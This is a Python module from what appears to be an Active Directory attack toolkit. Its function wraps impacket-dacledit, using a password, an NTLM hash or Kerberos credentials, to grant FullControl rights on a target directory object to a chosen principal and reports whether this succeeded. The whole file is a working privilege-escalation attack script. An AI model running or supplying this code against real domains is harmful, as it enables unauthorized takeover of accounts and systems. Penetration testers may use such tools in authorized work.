# modules/genericall.py

from core.colors import red, green, blue, yellow
from core.helpers import run_command

def attack_genericall(session, target_dn, principal=None):
    print(blue(f"[*] Attempting GenericAll abuse using impacket-dacledit on '{target_dn}'..."))

    principal = principal or session.username

    if session.hash:
        auth = f"{session.domain}/{session.username} -hashes :{session.hash}"
    elif session.password:
        auth = f"{session.domain}/{session.username}:{session.password}"
    else:
        auth = f"{session.domain}/{session.username} -k --no-pass"

    cmd = (
        f"impacket-dacledit -action write -rights FullControl "
        f"-principal \"{principal}\" -target-dn \"{target_dn}\" "
        f"{auth} -dc-ip {session.dc_ip}"
    )

    out, err = run_command(cmd)
    combined = out + "\n" + err
    lower = combined.lower()

    # Success
    if any(x in lower for x in ["success", "fullcontrol", "modified", "added"]):
        print(green("[+] GenericAll abuse likely succeeded. Output:"))
        print(green(out.strip()))
        return

    # Errors
    if "no such object" in lower:
        print(red("[-] Target DN not found (object doesn't exist)."))
    elif "access denied" in lower:
        print(red("[-] Access denied. Check if you actually have GenericAll on the object."))
    elif "unable to find" in lower or "invalid dn" in lower:
        print(red("[-] Invalid target DN format or object not reachable."))
    else:
        print(yellow("[!] Unknown result. Full output below:"))
        print(combined.strip())
